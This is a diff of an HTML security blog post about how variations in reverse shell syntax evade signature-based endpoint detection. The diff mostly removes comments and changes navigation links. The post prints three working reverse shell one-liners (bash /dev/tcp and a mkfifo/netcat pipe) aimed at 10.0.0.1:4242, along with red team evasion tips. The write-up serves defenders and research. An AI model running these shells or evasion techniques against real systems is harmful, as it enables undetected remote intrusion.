@@ -84,19 +84,13 @@
   </style>
 </head>
 <body style="box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.6; color:#333; background-color:#f5f7f9;">
-
-  <!-- Anchor for Back-to-Top -->
   <div id="top" aria-hidden="true"></div>
-
-  <!-- Header -->
   <header style="position:relative; background:linear-gradient(135deg,#2c3e50 0%,#4a6491 100%); color:#fff; padding:2rem; border-bottom:5px solid #ff5722;">
-    <!-- Back to Blogs link on the right, vertically centered -->
     <div id="backLink">
-      <a href="../blog.html" style="color:#ffb347; font-size:14px; text-decoration:none; font-weight:500;">
-        ← Back to Blogs
+      <a href="../projects.html" style="color:#ffb347; font-size:14px; text-decoration:none; font-weight:500;">
+        ← Back to Projects
       </a>
     </div>
-    <!-- Centered title + subtitle -->
     <div style="text-align:center;">
       <h1 id="title" style="font-size:2.8rem; margin:0 0 1rem;">
         EDR Evasion: How Reverse Shell Syntax Bypasses Detection
@@ -114,27 +108,19 @@
 
   <main id="content" role="main">
     <div style="margin:0 auto; padding:20px;">
-      <!-- Content grid -->
-      <!-- Main column -->
       <div class="main-article" style="background:#fff; padding:2rem; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,.1);">
         <div style="font-size:1.1rem; background:#e8f4fc; padding:1.5rem; border-left:4px solid #3498db; border-radius:4px; margin:0 0 2rem;">
           <p style="margin:0;">"Have you ever wondered why a slightly different reverse shell command might bypass security controls?"</p>
         </div>
-
         <p style="margin:0 0 1.2rem;">
           On my previous <a href="https://x.com/ironhulk_0xff/status/1962209989893976264?s=46" style="color:#ff5722; text-decoration:none; font-weight:500;"> <strong>post on X</strong></a>, while I was testing malware against Endpoint Detection and Response systems, I found something interesting. A standard reverse shell payload 
           from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" style="color:#ff5722; text-decoration:none; font-weight:500;"><strong>PayloadAllTheThings</strong></a> was quickly detected, but two other payloads from the same source that do the same thing went unnoticed. This post explains what I found, looking
           into how file descriptor redirection works and the key difference between signature-based detection and behavior-based detection in today's security tools.
         </p>
-
-        <!-- Background -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Understanding what is stdout &amp; stderr:</h2>
         <p style="margin:0 0 1.2rem;">In Unix/Linux systems, every process has three standard <strong>File Descriptors (FDs)</strong> by default:</p>
-
-        <!-- Infographic -->
         <div style="background:#f8f8f8; padding:1.5rem; border-radius:8px; margin:1.5rem 0;">
           <h3 style="text-align:center; color:#ff5722; margin:0 0 1rem;">Linux File Descriptors</h3>
-
           <div id="fdRow" style="display:flex; justify-content:space-between; margin:0 0 1.5rem;">
             <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
               <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">0</div>
@@ -152,13 +138,11 @@
               <div>Standard Error</div>
             </div>
           </div>
-
           <div style="margin:0 0 ; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #3498db; padding:1.2rem 1.5rem; border-radius:6px;">
             <p style="margin:0 0 0.8rem;">
               Every process in Unix/Linux starts with three default channels known as
               <code>stdin</code>, <code>stdout</code>, and <code>stderr</code>.
             </p>
-            <!-- stdin -->
             <div style="margin-bottom:1rem;">
               <strong style="color:#2c3e50;">Standard Input (stdin):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
@@ -167,7 +151,6 @@
                 <li><strong>Example:</strong> <code>cat &lt; file.txt</code></li>
               </ul>
             </div>
-            <!-- stdout -->
             <div style="margin-bottom:1rem;">
               <strong style="color:#2c3e50;">Standard Output (stdout):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
@@ -176,7 +159,6 @@
                 <li><strong>Example:</strong> <code>echo &quot;Hello&quot; &gt; out.txt</code></li>
               </ul>
             </div>
-            <!-- stderr -->
             <div>
               <strong style="color:#2c3e50;">Standard Error (stderr):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
@@ -193,16 +175,12 @@
             </div>
           </div>
         </div>
-
         <div style="margin:0 0 1.5rem; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #ff5722; padding:1.2rem 1.5rem; border-radius:6px;">
-          <!-- Intro -->
           <div style="margin:0 0 1.2rem; font-size:1.05rem; line-height:1.6; background:#fff8f6; border-left:4px solid #ff5722; padding:1rem 1.2rem; border-radius:6px;">
             <p style="margin:0;">
               A <strong>reverse shell</strong> is a simple but powerful method attackers use to take control of a system from a distance. Instead of the attacker trying to connect directly to the victim's computer, the victim's computer connects back to the attacker's machine, setting up a way to send and receive commands.
             </p>
           </div>
-
-          <!-- Definition -->
           <strong style="color:#c0392b; display:block; margin-bottom:.4rem;">Reverse Shell</strong>
           <ul style="margin:.5rem 0 0 1.2rem; padding:0;">
             <li><strong>What it is:</strong> A shell session where the target machine connects back to the attacker’s system.</li>
@@ -229,15 +207,11 @@
               </div>
             </li>
           </ul>
-
-          <!-- Reverse vs Bind Shell (theme-aware) -->
           <div style="margin:2rem 0 1rem; display:flex; align-items:flex-end; justify-content:space-between; gap:12px;">
             <h2 id="cmpHeading" style="margin:0; font-size:1.3rem; color:#1b2a41;">Reverse Shell vs Bind Shell</h2>
             <div style="height:1px; flex:1; background:#e6ecf5;"></div>
           </div>
-
           <div id="cmpWrap" style="display:flex; flex-wrap:wrap; gap:18px;">
-            <!-- Reverse Shell card -->
             <div id="revCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
               <h3 id="revTitle" style="margin:0 0 .8rem; color:#ff5722;">Reverse Shell</h3>
               <ul style="margin:0; padding-left:1.2rem;">
@@ -246,9 +220,7 @@
                 <li>Attacker needs a listener ready</li>
                 <li>More common in modern attacks</li>
               </ul>
-            </div>
-
-            <!-- Bind Shell card -->
+            </div> 
             <div id="bindCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
               <h3 id="bindTitle" style="margin:0 0 .8rem; color:#f59e0b;">Bind Shell</h3>
               <ul style="margin:0; padding-left:1.2rem;">
@@ -260,20 +232,14 @@
             </div>
           </div>
         </div>
-
         <p style="margin:1rem 0 0;">
           With the fundamentals of <strong>stdout, stderr, redirection, and reverse shells</strong> in place, we can finally turn to the experiment. Let’s break down why one command triggered detection while the others managed to slip through.
         </p>
-
-        <!-- Experiment -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">The Experiment: Testing EDR</h2>
         <div style="background:#ffebee; padding:1.2rem; border-left:4px solid #f44336; border-radius:4px; margin:1.5rem 0; font-size:.9rem;">
           <strong>Disclaimer:</strong> I have conducted this research in a controlled lab environment for educational purposes. All techniques are shared to help defenders improve their security posture. Always ensure you have explicit permission before testing on any system.
         </div>
-
         <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Understanding Each Command</h2>
-
-        <!-- First snippet (flagged) -->
         <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#fff8f6; border-left:4px solid #f44336; border-radius:6px;">
           <p style="margin:0 0 .6rem;"><strong>Flagged Payload:</strong></p>
           <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</pre>
@@ -287,8 +253,6 @@
             <strong>Why flagged:</strong> The <code>&gt;&amp;</code> + <code>/dev/tcp</code> pattern is a well-known reverse shell signature used in countless cheat sheets.
           </p>
         </div>
-
-        <!-- Second snippet (not flagged) -->
         <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
           <p style="margin:0 0 .6rem;"><strong>Unflagged Payload:</strong></p>
           <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1</pre>
@@ -303,8 +267,6 @@
             <strong>Why missed:</strong> The syntax order is less common and doesn’t match the “classic” signature pattern.
           </p>
         </div>
-
-        <!-- Third snippet (not flagged) -->
         <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
           <p style="margin:0 0 .6rem;"><strong>Unflagged Payload (FIFO + Netcat):</strong></p>
           <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f</pre>
@@ -325,10 +287,8 @@
         <div style="margin:1.2rem 0; padding:1.5rem; border-radius:12px; background:#f9fafb; border:1px solid #e5e7eb; box-shadow:0 4px 10px rgba(0,0,0,.05);">
           <p style="margin:0 0 1.2rem; font-size:1rem; line-height:1.6;">
             All three payloads achieved the same outcome; <strong>a fully interactive reverse shell</strong>.
-            What made the difference was not <strong><em>what they did</em></strong>, but <strong><em>how they looked syntactically</em></strong>, which will be explained in the table below table:
+            What made the difference was not <strong><em>what they did</em></strong>, but <strong><em>how they looked syntactically</em></strong>, which will be explained in the table below t
           </p>
-
-          <!-- Comparison table -->
           <div class="h-scroll" role="region" aria-label="Payload comparison table" tabindex="0">
             <table style="border-collapse:collapse; margin:1rem 0; font-size:.95rem; border-radius:8px">
               <thead>
@@ -375,15 +335,11 @@
               </tbody>
             </table>
           </div>
-          <!-- Final takeaway -->
           <div style="margin-top:1.2rem; padding:1rem 1.2rem; border-left:4px solid #3498db; background:#eef6fc; border-radius:6px; font-size:.95rem; line-height:1.5;">
             <strong>Final takeaway:</strong> Functionally, all three commands do the same thing, they remap <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> into a network socket.
           </div>
         </div>
-
-        <!-- Implications -->
         <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Implications for Security Teams</h2>
-
         <h3 style="color:#3498db; margin:1.5rem 0 .8rem;">For Blue Teams (Defenders)</h3>
         <p style="margin:0 0 1.2rem;">Relying solely on signature-based detection is insufficient. To improve security posture:</p>
         <ul style="margin:0 0 1.2rem 1.2rem;">
@@ -392,7 +348,6 @@
           <li>Regularly test your defenses with varied techniques</li>
           <li>Monitor for suspicious parent-child process relationships</li>
         </ul>
-
         <h3 style="color:#3498db; margin:1.5rem 0 .8rem;">For Red Teams (Attackers)</h3>
         <p style="margin:0 0 1.2rem;">Understanding the underlying mechanics of detection evasion is crucial:</p>
         <ul style="margin:0 0 1.2rem 1.2rem;">
@@ -401,8 +356,6 @@
           <li>Consider using custom encoders or obfuscation techniques</li>
           <li>Always test techniques against target security controls</li>
         </ul>
-
-        <!-- Conclusion -->
         <div style="background:#e8f5e9; padding:1.5rem; border-left:4px solid #4caf50; border-radius:4px;">
           <h2 style="color:#2c3e50; border-bottom:2px solid #eee;">Conclusion</h2>
           <p>
@@ -414,25 +367,20 @@
         </div>
       </div>
     </div>
-
-    <!-- Footer -->
     <footer style="position:relative;  background:#2c3e50; color:#fff; border-radius:8px;">
       <div style="max-width:1000px; margin:0 auto; padding:20px; text-align:center;">
         <p style="margin:0 0 .6rem;">Crafted with Passion</p>
         <p style="margin:0;">2025 © Iron Hulk — All Rights Reserved.</p>
-        <a href="../blog.html" style="color:#94a3b8; font-size:13px; padding:6px 12px; border-radius:6px; text-decoration:none;">
-          ← Back to Blogs
+        <a href="../projects.html" style="color:#94a3b8; font-size:13px; padding:6px 12px; border-radius:6px; text-decoration:none;">
+          ← Back to Projects
         </a>
       </div>
-      <!-- Back to Top arrow pinned to the right -->
       <a href="#top" style="position:absolute; right:20px; top:50%; transform:translateY(-50%); color:#94a3b8; text-decoration:none;">
         <svg xmlns="http://www.w3.org/2000/svg" style="width:24px; height:24px;" viewBox="0 0 20 20" fill="currentColor">
           <path fill-rule="evenodd" d="M3.707 10.707a1 1 0 01-1.414-1.414l7-7a1 1 0 011.414 0l7 7a1 1 0 11-1.414 1.414L11 4.414V19a1 1 0 11-2 0V4.414L3.707 10.707z" clip-rule="evenodd" />
         </svg>
       </a>
     </footer>
-
-    <!-- Simple responsive behavior (kept; now only fdRow matters) -->
     <script>
       function applyResponsive() {
         const fdRow = document.getElementById('fdRow');
@@ -446,7 +394,6 @@
       applyResponsive();
       window.addEventListener('resize', applyResponsive);
     </script>
-
     <script>
       document.addEventListener("DOMContentLoaded", function () {
         const content = document.getElementById("content");
